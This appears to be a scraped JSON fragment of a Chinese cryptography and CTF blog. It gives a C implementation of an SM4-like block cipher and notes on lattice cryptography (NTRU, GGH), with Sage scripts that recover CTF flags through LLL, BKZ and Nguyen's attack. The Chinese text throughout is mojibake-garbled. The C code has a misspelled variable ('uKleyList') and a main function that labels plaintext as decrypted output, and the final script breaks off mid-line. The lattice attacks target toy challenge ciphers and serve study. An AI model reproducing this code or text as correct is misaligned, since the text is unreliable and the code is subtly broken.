è§£å¯†æ•°æ®å¤„ç†å‡½æ•°,å…ˆä½¿ç”¨Sboxè¿›è¡Œéçº¿æ€§å˜åŒ–ï¼Œå†è¿›è¡Œçº¿æ€§å˜æ¢Lu32 func_data(u32 input)&#123; int i = 0; u32 ulTmp = 0; u8 ucIndexList[4] = &#123; 0 &#125;; u8 ucSboxValueList[4] = &#123; 0 &#125;; uLong2four_uCh(input, ucIndexList); for (i = 0; i &lt; 4; i++) &#123; ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]]; &#125; four_uCh2uLong(ucSboxValueList, &amp;ulTmp); ulTmp = ulTmp ^ move(ulTmp, 2) ^ move(ulTmp, 10) ^ move(ulTmp, 18) ^ move(ulTmp, 24); return ulTmp;&#125;//åŠ å¯†å‡½æ•°ï¼ˆå¯ä»¥åŠ å¯†ä»»æ„é•¿åº¦æ•°æ®ï¼Œ16å­—èŠ‚ä¸ºä¸€æ¬¡å¾ªç¯ï¼Œä¸è¶³éƒ¨åˆ†è¡¥0å‡‘é½16å­—èŠ‚çš„æ•´æ•°å€ï¼‰//len:æ•°æ®é•¿åº¦(ä»»æ„é•¿åº¦æ•°æ®) key:å¯†é’¥ï¼ˆ16å­—èŠ‚ï¼‰ input:è¾“å…¥çš„åŸå§‹æ•°æ® output:åŠ å¯†åè¾“å‡ºæ•°æ®void encode_fun(u8 len, u8* key, u8* input, u8* output)&#123; int i = 0, j = 0; u8* p = (u8*)malloc(50); //å®šä¹‰ä¸€ä¸ª50å­—èŠ‚ç¼“å­˜åŒº u32 ulKeyTmpList[4] = &#123; 0 &#125;; //å­˜å‚¨å¯†é’¥çš„u32æ•°æ® u32 ulKeyList[36] = &#123; 0 &#125;; //ç”¨äºå¯†é’¥æ‰©å±•ç®—æ³•ä¸ç³»ç»Ÿå‚æ•°FKè¿ç®—åçš„ç»“æœå­˜å‚¨ u32 ulDataList[36] = &#123; 0 &#125;; //ç”¨äºå­˜æ”¾åŠ å¯†æ•°æ® /***************************å¼€å§‹ç”Ÿæˆå­ç§˜é’¥********************************************/ four_uCh2uLong(key, &amp;(ulKeyTmpList[0])); four_uCh2uLong(key + 4, &amp;(ulKeyTmpList[1])); four_uCh2uLong(key + 8, &amp;(ulKeyTmpList[2])); four_uCh2uLong(key + 12, &amp;(ulKeyTmpList[3])); ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0]; ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1]; ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2]; ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3]; for (i = 0; i &lt; 32; i++) //32æ¬¡å¾ªç¯è¿­ä»£è¿ç®— &#123; //5-36ä¸º32ä¸ªå­ç§˜é’¥ ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]); &#125; /***********************************ç”Ÿæˆ32è½®32ä½é•¿å­ç§˜é’¥ç»“æŸ**********************************/ for (i = 0; i &lt; len; i++) //å°†è¾“å…¥æ•°æ®å­˜æ”¾åœ¨pç¼“å­˜åŒº *(p + i) = *(input + i); for (i = 0; i &lt; 16 - len % 16; i++)//å°†ä¸è¶³16ä½è¡¥0å‡‘é½16çš„æ•´æ•°å€ *(p + len + i) = 0; for (j = 0; j &lt; len / 16 + ((len % 16) ? 1 : 0); j++) //è¿›è¡Œå¾ªç¯åŠ å¯†,å¹¶å°†åŠ å¯†åæ•°æ®ä¿å­˜ï¼ˆå¯ä»¥çœ‹å‡ºæ­¤å¤„æ˜¯ä»¥16å­—èŠ‚ä¸ºä¸€æ¬¡åŠ å¯†ï¼Œè¿›è¡Œå¾ªç¯ï¼Œå³è‹¥16å­—èŠ‚åˆ™è¿›è¡Œä¸€æ¬¡ï¼Œ17å­—èŠ‚è¡¥0è‡³32å­—èŠ‚åè¿›è¡ŒåŠ å¯†ä¸¤æ¬¡ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ &#123; /*å¼€å§‹å¤„ç†åŠ å¯†æ•°æ®*/ four_uCh2uLong(p + 16 * j, &amp;(ulDataList[0])); four_uCh2uLong(p + 16 * j + 4, &amp;(ulDataList[1])); four_uCh2uLong(p + 16 * j + 8, &amp;(ulDataList[2])); four_uCh2uLong(p + 16 * j + 12, &amp;(ulDataList[3])); //åŠ å¯† for (i = 0; i &lt; 32; i++) &#123; ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[i + 4]); &#125; /*å°†åŠ å¯†åæ•°æ®è¾“å‡º*/ uLong2four_uCh(ulDataList[35], output + 16 * j); uLong2four_uCh(ulDataList[34], output + 16 * j + 4); uLong2four_uCh(ulDataList[33], output + 16 * j + 8); uLong2four_uCh(ulDataList[32], output + 16 * j + 12); &#125; free(p);&#125;//è§£å¯†å‡½æ•°ï¼ˆä¸åŠ å¯†å‡½æ•°åŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯ç§˜é’¥ä½¿ç”¨çš„é¡ºåºä¸åŒï¼Œå³æŠŠé’¥åŒ™åç€ç”¨å°±æ˜¯è§£å¯†ï¼‰//len:æ•°æ®é•¿åº¦ key:å¯†é’¥ input:è¾“å…¥çš„åŠ å¯†åæ•°æ® output:è¾“å‡ºçš„è§£å¯†åæ•°æ®void decode_fun(u8 len, u8* key, u8* input, u8* output)&#123; int i = 0, j = 0; u32 ulKeyTmpList[4] = &#123; 0 &#125;;//å­˜å‚¨å¯†é’¥çš„u32æ•°æ® u32 ulKeyList[36] = &#123; 0 &#125;; //ç”¨äºå¯†é’¥æ‰©å±•ç®—æ³•ä¸ç³»ç»Ÿå‚æ•°FKè¿ç®—åçš„ç»“æœå­˜å‚¨ u32 ulDataList[36] = &#123; 0 &#125;; //ç”¨äºå­˜æ”¾åŠ å¯†æ•°æ® /*å¼€å§‹ç”Ÿæˆå­ç§˜é’¥*/ four_uCh2uLong(key, &amp;(ulKeyTmpList[0])); four_uCh2uLong(key + 4, &amp;(ulKeyTmpList[1])); four_uCh2uLong(key + 8, &amp;(ulKeyTmpList[2])); four_uCh2uLong(key + 12, &amp;(ulKeyTmpList[3])); ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0]; ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1]; ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2]; ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3]; for (i = 0; i &lt; 32; i++) //32æ¬¡å¾ªç¯è¿­ä»£è¿ç®— &#123; //5-36ä¸º32ä¸ªå­ç§˜é’¥ ulKeyList[i + 4] = uKleyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]); &#125; /*ç”Ÿæˆ32è½®32ä½é•¿å­ç§˜é’¥ç»“æŸ*/ for (j = 0; j &lt; len / 16; j++) //è¿›è¡Œå¾ªç¯åŠ å¯†,å¹¶å°†åŠ å¯†åæ•°æ®ä¿å­˜ &#123; /*å¼€å§‹å¤„ç†è§£å¯†æ•°æ®*/ four_uCh2uLong(input + 16 * j, &amp;(ulDataList[0])); four_uCh2uLong(input + 16 * j + 4, &amp;(ulDataList[1])); four_uCh2uLong(input + 16 * j + 8, &amp;(ulDataList[2])); four_uCh2uLong(input + 16 * j + 12, &amp;(ulDataList[3])); //è§£å¯† for (i = 0; i &lt; 32; i++) &#123; ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[35 - i]);//ä¸åŠ å¯†å”¯ä¸€ä¸åŒçš„å°±æ˜¯è½®å¯†é’¥çš„ä½¿ç”¨é¡ºåº &#125; /*å°†è§£å¯†åæ•°æ®è¾“å‡º*/ uLong2four_uCh(ulDataList[35], output + 16 * j); uLong2four_uCh(ulDataList[34], output + 16 * j + 4); uLong2four_uCh(ulDataList[33], output + 16 * j + 8); uLong2four_uCh(ulDataList[32], output + 16 * j + 12); &#125;&#125;//æ— ç¬¦å·å­—ç¬¦æ•°ç»„è½¬16è¿›åˆ¶æ‰“å°void print_hex(u8* data, int len)&#123; int i = 0; char alTmp[16] = &#123; &#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27; &#125;; for (i = 0; i &lt; len; i++) &#123; printf(&quot;%c&quot;, alTmp[data[i] / 16]); printf(&quot;%c&quot;, alTmp[data[i] % 16]); putchar(&#x27; &#x27;); &#125; putchar(&#x27;\\n&#x27;);&#125;/*åœ¨ä¸»å‡½æ•°ä¸­å®ç°ä»»æ„å­—èŠ‚åŠ å¯†ä¸è§£å¯†ï¼Œå¹¶ä¸”ç»“æœæ­£ç¡®*/int main(void)&#123; u8 i, len; u8 encode_Result[50] = &#123; 0 &#125;; //å®šä¹‰åŠ å¯†è¾“å‡ºç¼“å­˜åŒº u8 decode_Result[50] = &#123; 0 &#125;; //å®šä¹‰è§£å¯†è¾“å‡ºç¼“å­˜åŒº u8 key[16] = &#123; 0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10 &#125;; //å®šä¹‰16å­—èŠ‚çš„å¯†é’¥ //u8 Data_plain[18] = &#123; 0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10,0x01,0x23 &#125;;//å®šä¹‰18å­—èŠ‚çš„åŸå§‹è¾“å…¥æ•°æ®ï¼ˆæµ‹è¯•ç”¨ï¼‰ //u8 Data_plain[32] = &#123; 0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10,0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10 &#125;;//å®šä¹‰32å­—èŠ‚çš„åŸå§‹è¾“å…¥æ•°æ®ï¼ˆæµ‹è¯•ç”¨ï¼‰ u8 Data_plain[16] = &#123; 0x01,0x23,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;;//å®šä¹‰16å­—èŠ‚çš„åŸå§‹è¾“å…¥æ•°æ®ï¼ˆæµ‹è¯•ç”¨ï¼‰ len = 16 * (sizeof(Data_plain) / 16) + 16 * ((sizeof(Data_plain) % 16) ? 1 : 0);//å¾—åˆ°æ‰©å……åçš„å­—èŠ‚æ•°ï¼ˆè§£å¯†å‡½æ•°ä¼šç”¨åˆ°ï¼‰ decode_fun(len, key, Data_plain, decode_Result); //æ•°æ®è§£å¯† printf(&quot;è§£å¯†åæ•°æ®æ˜¯ï¼š\\n&quot;); for (i = 0; i &lt; len; i++) printf(&quot;%x &quot;, *(decode_Result + i)); system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"å—å¯†ç ","slug":"å—å¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E5%9D%97%E5%AF%86%E7%A0%81/"},{"name":"AES","slug":"AES","permalink":"https://lazzzaro.github.io/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://lazzzaro.github.io/tags/DES/"}],"author":"Lazzaro"},{"title":"æ ¼å¯†ç ","slug":"crypto-æ ¼å¯†ç ","date":"2020-11-07T03:53:05.000Z","updated":"2023-11-08T16:42:09.201Z","comments":true,"path":"2020/11/07/crypto-æ ¼å¯†ç /","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-%E6%A0%BC%E5%AF%86%E7%A0%81/","excerpt":"","text":"â€‹ æ ¼å¯†ç çº¿æ€§ç‹¬ç«‹ç©ºé—´ä¸Šæœ‰é›†åˆ $v_1,\\cdots,v_n \\in \\mathbb{R}^n$ï¼Œæ ¼ï¼ˆLatticesï¼‰å°±æ˜¯è¿™äº›å‘é‡çš„çº¿æ€§ç»„åˆï¼Œç”¨å…¬å¼è¡¨ç¤ºä¸ºï¼š $L=\\{a_1v_1+a_2v_2+\\cdots+a_nv_n \\mid a_1,a_2,\\cdots,a_n \\in \\mathbb{Z}\\}$ã€‚ æ ¼ $L$ çš„ç»´æ•°ç­‰äºæ ¼ä¸­å‘é‡çš„ä¸ªæ•°ã€‚ å‡å®š $v_1,v_2,\\cdots,v_n$ æ˜¯æ ¼ $L$ çš„åŸºï¼Œ$w_1,w_2,\\cdots,w_n \\in L$ï¼Œåˆ™å¿…ç„¶å­˜åœ¨æ•´ç³»æ•° $a_{ij}$ ä½¿å¾—ï¼š $\\begin{cases} w_1=a_{11}v_1+a_{12}v_2+\\cdots+a_{1n}v_n \\\\ w_2=a_{21}v_1+a_{22}v_2+\\cdots+a_{2n}v_n \\\\ \\vdots \\\\ w_n=a_{n1}v_1+a_{n2}v_2+\\cdots+a_{nn}v_n \\end{cases}$ è¿™æ ·ï¼Œæ ¼çš„é—®é¢˜å°±æ˜¯çŸ©é˜µè¿ç®—äº†ã€‚ æœ€çŸ­å‘é‡é—®é¢˜ï¼ˆSVPï¼ŒThe Shortest Vector Problemï¼‰ï¼š å¯»æ‰¾ä¸€ä¸ªæ ¼ $L$ ä¸­æœ€çŸ­çš„éé›¶å‘é‡ã€‚å³ï¼Œå¯»æ‰¾ä¸€ä¸ª $v \\in L$ æ»¡è¶³å…¶æ¬§å‡ é‡Œå¾·èŒƒæ•° $\\mid\\mid v \\mid\\mid$ æœ€å°ã€‚ æœ€æ¥è¿‘å‘é‡é—®é¢˜ï¼ˆCVPï¼ŒThe Closest Vector Problemï¼‰ï¼š å¯¹äºä¸€ä¸ªéæ ¼ $L$ ä¸­çš„å‘é‡ $w$ï¼Œåœ¨æ ¼ä¸­å¯»æ‰¾ä¸€ä¸ªå‘é‡ $v$ï¼Œä½¿å¾— $\\mid\\mid w-v \\mid\\mid$ æœ€å°ã€‚ CVPå’ŒSVPéƒ½æ˜¯NPå®Œå¤‡é—®é¢˜ï¼Œå› æ­¤æ±‚è§£èµ·æ¥ååˆ†å›°éš¾ï¼Œå› æ­¤è¿™ä¸¤ä¸ªé—®é¢˜éƒ½æ˜¯å¯ä»¥ä½œä¸ºå¯†é’¥ä½“åˆ¶çš„åŸºç¡€çš„ã€‚ æ„é€ ç¤ºä¾‹ $bm-kn-c=-r \\Longrightarrow \\begin{bmatrix} m &amp; -1 &amp; -k \\end{bmatrix}\\begin{bmatrix} 1 &amp; 0 &amp; b \\newline 0 &amp; 2^{400} &amp; c \\newline 0 &amp; 0 &amp; n \\end{bmatrix}=\\begin{bmatrix} m &amp; -2^{400} &amp; -r \\end{bmatrix}$ LLLåŠ é€Ÿï¼šflatter 12345678910from subprocess import check_outputfrom re import findalldef flatter(M): # compile https://github.com/keeganryan/flatter and put it in $PATH z = &quot;[[&quot; + &quot;]\\n[&quot;.join(&quot; &quot;.join(map(str, row)) for row in M) + &quot;]]&quot; ret = check_output([&quot;flatter&quot;], input=z.encode()) return matrix(M.nrows(), M.ncols(), map(int, findall(b&quot;-?\\\\d+&quot;, ret)))L = flatter(M) å‚è€ƒï¼š æ ¼æ”»å‡»ä¹‹å°æœªçŸ¥æ•°æ–¹ç¨‹æ±‚è§£å…¥é—¨â€”â€”åŸç†ä¸ä¾‹å­ â€‹ NRTUæ ¼å¯†ç NTRUæ˜¯ä¸€ä¸ªå¸¦æœ‰ä¸“åˆ©ä¿æŠ¤çš„å¼€æºå…¬å¼€å¯†é’¥åŠ å¯†ç³»ç»Ÿï¼Œä½¿ç”¨åŸºäºæ ¼çš„åŠ å¯†ç®—æ³•æ¥åŠ å¯†æ•°æ®ã€‚å®ƒåŒ…æ‹¬ä¸¤éƒ¨åˆ†ç®—æ³•ï¼šNTRUEncryptç”¨æ¥åŠ å¯†ï¼ŒNTRUSignç”¨æ¥è¿›è¡Œæ•°å­—ç­¾åã€‚ä¸å…¶ä»–æµè¡Œçš„å…¬é’¥åŠ å¯†ç³»ç»Ÿä¸åŒï¼Œå®ƒå¯ä»¥é˜²æ­¢è¢«Shorç®—æ³•ç ´è§£ï¼Œå¹¶æ˜¾è‘—æå‡äº†æ€§èƒ½ã€‚ åœ¨åŒç­‰åŠ å¯†å¼ºåº¦ä¸‹ï¼ŒNTRUæ‰§è¡Œå¤§å¼€é”€çš„ç§é’¥æ“ä½œæ¯”RSAç®—æ³•å¿«å¾—å¤šã€‚RSAç®—æ³•çš„ç§é’¥æ“ä½œè€—æ—¶ä¸å¯†é’¥é•¿åº¦å‘ˆä¸‰æ¬¡æ–¹å…³ç³»ï¼Œè€ŒNTRUç›¸åº”æ“ä½œä¸ºäºŒæ¬¡æ–¹å…³ç³»ã€‚ NTRUå¯†ç ä½“åˆ¶ï¼Œéœ€è¦ä¸‰ä¸ªæ•´æ•°å‚æ•° $(N,p,q)$ å’Œå››ä¸ªæ¬¡æ•°ä¸º $N-1$ çš„æ•´ç³»æ•°å¤šé¡¹å¼é›†åˆ $L_f,L_g,L_{\\varphi},L_m$ï¼Œåœ¨è¿™é‡Œ $N$ ä¸ºä¸€ç´ æ•°ï¼Œ$p,q$ å¯ä»¥ä¸å¿…ä¸ºç´ æ•°ï¼Œä½†ä¸ºå®‰å…¨ï¼Œè¦æ±‚ $\\gcd(p,q)=1$ï¼Œä¸” $q$ è¿œå¤§äº $p$ã€‚ NTRUå·¥ä½œäºå¤šé¡¹å¼æ•´æ•°ç¯ $\\mathbb{R}=\\mathbb{Z}[x]/(x^N-1)$ï¼Œå½“ $F \\in \\mathbb{R}$ï¼Œå¯ä»¥æŠŠ $F$ è¡¨ç¤ºä¸ºå¤šé¡¹å¼æˆ–å‘é‡å½¢å¼ï¼Œ$F=\\sum\\limits_{i=0}^{N-1}F_ix^i=[F_0,F_1,\\cdots,F_{N-1}]$ã€‚ åœ¨è¿™é‡Œè®° $L(d_1,d_2)=\\{F \\in \\mathbb{R}:F$ æœ‰ $d_1$ ä¸ªç³»æ•°ä¸º $1$ï¼Œ$d_2$ ä¸ªç³»æ•°ä¸º $-1$ï¼Œå…¶ä½™ä¸º $0\\}$ï¼Œé€‰å–ä¸‰ä¸ªç¡®å®šçš„æ•´æ•° $d_f,d_g,d_{\\varphi}$ï¼Œå¤šé¡¹å¼é›†åˆ $L_f=L(d_f,d_{f-1}),L_g=L(d_g,d_g),L_{\\varphi}=L(d_{\\varphi},d_{\\varphi})$ï¼Œè€Œ $L_m=\\{m \\in \\mathbb{R}:m$ çš„ç³»æ•°ä½äºåŒºé—´ $[-\\cfrac{p-1}{2},\\cfrac{p-1}{2}]$ï¼Œå…¶ä¸­ $p$ ä¸ºç´ æ•° $\\}$ã€‚ å¯†é’¥ç”Ÿæˆ Béšæœºé€‰æ‹©ä¸¤ä¸ªå¤šé¡¹å¼ $f$ å’Œ $g$ï¼Œ$f\\in L_f,g\\in L_g$ï¼Œè¦æ±‚ $f$ å…³äºæ¨¡ $p$ å’Œæ¨¡ $q$ çš„é€† $F_p,F_q$ éƒ½å­˜åœ¨ï¼Œä¹Ÿå³ $F_q \\star f \\equiv 1 \\pmod q$ å’Œ $F_p \\star f \\equiv 1 \\pmod p$ï¼Œè¿™é‡Œå¯ä»¥ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®—å‡º $F_p$ å’Œ $F_q$ã€‚ä¸ºæ­¤ï¼Œ $f$ é¦–å…ˆåº”æ»¡è¶³ $\\gcd(f(1),pq)=1$ï¼Œå¦‚æœæœ‰ä¸€ä¸ªé€†ä¸å­˜åœ¨ï¼Œéœ€é‡æ–°é€‰æ‹© $f$ã€‚ ç„¶åï¼ŒBè®¡ç®— $h \\equiv F_q \\star g \\pmod q$ï¼Œåˆ™å…¬é’¥ä¸º $h$ï¼Œç§é’¥ä¸º $f$ï¼Œä½†åœ¨å®é™…ä¸­ï¼Œè¿˜å°†å­˜å‚¨ $F_p$ï¼Œå› è€Œä¸€èˆ¬è®¤ä¸ºç§é’¥ä¸º $(f,F_p)$ã€‚ åŠ å¯† å‡è®¾Aæƒ³å‘é€ä¿¡æ¯ $m \\in L_m$ ç»™Bï¼Œä»–å°†æ ¹æ®å‚æ•° $d_{\\varphi}$ éšæœºé€‰æ‹©ä¸€ä¸ª $\\varphi \\in L_{\\varphi}$ï¼Œç„¶åï¼Œä»–åˆ©ç”¨Bçš„å…¬é’¥ $h$ è®¡ç®— $e \\equiv \\varphi \\star h+m \\pmod q$ AæŠŠå¯†æ–‡ $e$ å‘é€ç»™Bã€‚ è§£å¯† å½“Bæ”¶åˆ°å¯†æ–‡ $e$ åï¼Œä»–é¦–å…ˆåˆ©ç”¨ç§é’¥ $f$ è®¡ç®— $a \\equiv f \\star e \\pmod q$ é€‰æ‹© $a$ çš„ç³»æ•°ä½äº $[-\\cfrac{p-1}{2},\\cfrac{p-1}{2}]$ ä¹‹é—´ï¼Œç„¶åè®¡ç®— $b \\equiv a \\pmod p$ $c \\equiv F_p \\star b \\pmod p$ åˆ™å¤šé¡¹å¼ $c$ å°±æ˜¯æ˜æ–‡ $m$ã€‚ æ„é€ çŸ©é˜µ $B^{NT}= \\left(\\begin {array}{c} I &amp; H \\newline 0 &amp; q \\end{array} \\right) =\\left(\\begin {array}{cccc|cccc} \\lambda &amp; 0 &amp; \\cdots &amp; 0 &amp; h_0 &amp; h_1 &amp; \\cdots &amp; h_{N-1} \\newline 0 &amp; \\lambda &amp; \\cdots &amp; 0 &amp; h_{N-1} &amp; h_0 &amp; \\cdots &amp; h_{N-2}\\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; \\lambda &amp; h_1 &amp; h_2 &amp; \\cdots &amp; h_0 \\newline \\hline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; q &amp; 0 &amp; \\cdots &amp; 0 \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; q &amp; \\cdots &amp; 0 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; q\\end{array} \\right) $ å…¶ä¸­ $H$ æ˜¯æ ¹æ®å…¬é’¥å¤šé¡¹å¼çš„ç³»æ•°ç”Ÿæˆçš„å¾ªç¯çŸ©é˜µã€‚ æ„å»ºä¸€ä¸ªè¿™æ ·çš„çŸ©é˜µï¼Œç„¶åè¿›è¡ŒLLLç®—æ³•å¾—åˆ°è§£å¯†å¯†é’¥ã€‚ å‚è€ƒ ä»ä¸€é“CTFé¢˜åˆæ¢NTRUæ ¼å¯†ç  Practical lattice-based cryptography: NTRUEncrypt and NTRUSign 1234567891011121314#Sageh = p = c = v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f, g = m.LLL()[0]print(f, g)a = f*c % p % gm = a * inverse_mod(f, g) % gprint(bytes.fromhex(hex(m)[2:])) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#Sage #å¤šé¡¹å¼1N =p =q =Q.&lt;x&gt; = Zmod(q)[]P.&lt;y&gt; = Zmod(p)[]ex = hx = print(&#x27;-------decrypt------&#x27;)qq = x^N-1pp = y^N-1hn = [int(x) for x in hx.coefficients()]n = len(hn)A1 = matrix.identity(n)A0 = matrix.zero(n)Aq = matrix.identity(n) * qAh = matrix(ZZ, [hn[-i:] + hn[:-i] for i in range(n)])M = block_matrix([A1,Ah,A0,Aq],nrows=2)L = M.LLL()v = L[0]f = list(v)[:n]g = list(v)[n:]fx = Q(f)fy = P(f)gx = Q(g)Fqx = fx.inverse_mod(qq)Fpy = fy.inverse_mod(pp)#hxx = (Fqx*gx).mod(x^N-1)#print(hxx==hx)ax = (fx*ex).mod(qq)an = [int(x) for x in ax.coefficients()]#ä¸­å¿ƒæå‡(centerlift)ï¼Œä½¿åŸŸèŒƒå›´ä»[0,q)å˜æ¢åˆ°(-q/2,q/2)for i in range(len(an)): if an[i] &gt; q//2: an[i] -= qax = P(an)print(ax)out = (Fpy * ax).mod(pp)print(out)print(bytes(out.coefficients())) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748p = q = n = Zx.&lt;x&gt; = ZZ[]e = h = def inv_mod_prime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f)))def mul(f,g): return (f * g) % (x^n-1)def bal_mod(f,q): g = list(((f[i] + q//2) % q) - q//2 for i in range(n)) return Zx(g)def decrypt(e,pri_key): f,fp = pri_key a = bal_mod(mul(e,f),q) d = bal_mod(mul(a,fp),p) return ddef get_key(): for j in range(2 * n): try: f = Zx(list(M[j][:n])) fp = inv_mod_prime(f,p) return (f,fp) except: pass return (f,f)M = matrix(ZZ, 2*n, 2*n)hh = h.list()for i in range(n): M[i,i] = 1for i in range(n,2*n): M[i,i] = qfor i in range(n): for j in range(n): M[i,j+n] = hh[(n-i+j) % n]M = M.LLL()key = get_key()l = decrypt(e, key).list()flag = bytes(l)print(flag) å‚è€ƒï¼š SCTF-XCTF 2020 - Lattice MAR DASCTF - threshold â€‹ GGHåŠ å¯†1997å¹´ï¼ŒGoldreichã€Goldwasserã€Haleviä¸‰äººå—Ajtaiåœ¨æ ¼éš¾é¢˜ä¸Šçš„ç ”ç©¶æ‰€å¯å‘ï¼Œæå‡ºäº†ä¸€ä¸ªåŸºäºæ ¼ä¸­æœ€è¿‘å‘é‡éš¾é¢˜çš„éå¯¹ç§°å¯†ç å­¦ç®—æ³•ï¼šGGH Cryptosystemã€‚ 1999å¹´ï¼ŒNguyenå‘ç°åœ¨è¿™ä¸ªå¯†ç å­¦ç®—æ³•è®¾è®¡ä¸­ï¼Œæœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç¼ºé™·ï¼Œå¯ä»¥ä½¿æ”»å‡»è€…ä»å¯†æ–‡ä¸­è·å–åˆ°æ˜æ–‡çš„éƒ¨åˆ†ä¿¡æ¯ï¼Œä¸”å¯ä»¥å°†åŸæ¥çš„æœ€è¿‘å‘é‡éš¾é¢˜è½¬åŒ–ä¸ºä¸€ä¸ªè¾ƒä¸ºç®€å•çš„æœ€è¿‘å‘é‡éš¾é¢˜ã€‚åŸºäºè¿™ä¸ªè§‚å¯Ÿï¼ŒNguyenè§£å‡ºäº†è®¾è®¡è€…æ”¾åœ¨ç½‘ä¸Šçš„5ä¸ªchallengeä¸­çš„4ä¸ªï¼ˆå…¶ä¸­æœ‰2ä¸ªè¢«è®¾è®¡è€…è®¤ä¸ºæ˜¯ä¸å¯èƒ½æ”»ç ´çš„ï¼‰ï¼Œè¶³ä»¥è¯æ˜è¯¥å¯†ç ç®—æ³•æ˜¯brokençš„ã€‚ å®šä¹‰ GGHåŒ…å«ä¸€ä¸ªç§é’¥å’Œä¸€ä¸ªå…¬é’¥ï¼Œé€‰å–æ ¼ $L$ çš„ä¸€ç»„å¥½åŸº $B$ å’Œä¸€ä¸ªå¹ºæ¨¡çŸ©é˜µ $U$ ä½œä¸ºç§é’¥ï¼Œè®¡ç®— $L$ çš„å¦ä¸€ç»„åŸº $Bâ€™=UB$ ä½œä¸ºå…¬é’¥ã€‚ é€‰å®š $M$ å€¼ï¼Œæ˜æ–‡å‘é‡ $(m_1,m_2,\\cdots,m_n), \\quad m_i \\in(-M,M)$ã€‚ åŠ å¯† ç»™å®šæ˜æ–‡ $m=(m_1,m_2,\\cdots,m_n)$ï¼Œè¯¯å·®å‘é‡ $e$ï¼Œå’Œå…¬é’¥ $Bâ€™$ï¼Œè®¡ç®— $v=m \\cdot Bâ€™=\\displaystyle\\sum m_ib_iâ€™$ï¼› å¯†æ–‡ $c=v+e=m \\cdot Bâ€™+e$ã€‚ è§£å¯† è®¡ç®— $c \\cdot B^{-1}=(m \\cdot Bâ€™+e)B^{-1}=m \\cdot U \\cdot B \\cdot B^{-1}+e \\cdot B^{-1}=m \\cdot U+e \\cdot B^{-1}$ï¼› å¦‚æœ $e \\cdot B^{-1}$ è¶³å¤Ÿå°ï¼Œå¯åˆ©ç”¨Babaiæœ€è¿‘å¹³é¢ç®—æ³•çš„å˜ç§Babai rounding techniqueå»é™¤ï¼› æœ€åè®¡ç®— $m=m \\cdot U \\cdot U^{-1} $ å¾—åˆ°æ˜æ–‡ã€‚ GGHä¸­çš„è¯¯å·®å‘é‡çš„é€‰å–æ˜¯3æˆ–è€…-3ã€‚ æ±‚è§£ åˆ©ç”¨Nguyenâ€™s Attackç®—æ³•ã€‚ 123456789101112131415161718192021222324252627# Sage # Read ciphertext and public key.c = []c = vector(ZZ, c)B = []B = matrix(ZZ, B)# Nguyen&#x27;s Attack.n = 150delta = 3s = vector(ZZ, [delta]*n)B6 = B.change_ring(Zmod(2*delta))left = (c + s).change_ring(Zmod(2*delta))m6 = (B6.solve_left(left)).change_ring(ZZ)new_c = (c - m6*B) * 2 / (2*delta)# embedded techniquenew_B = (B*2).stack(new_c).augment(vector(ZZ, [0]*n + [1]))new_B = new_B.change_ring(ZZ)new_B_BKZ = new_B.BKZ()shortest_vector = new_B_BKZ[0]mbar = 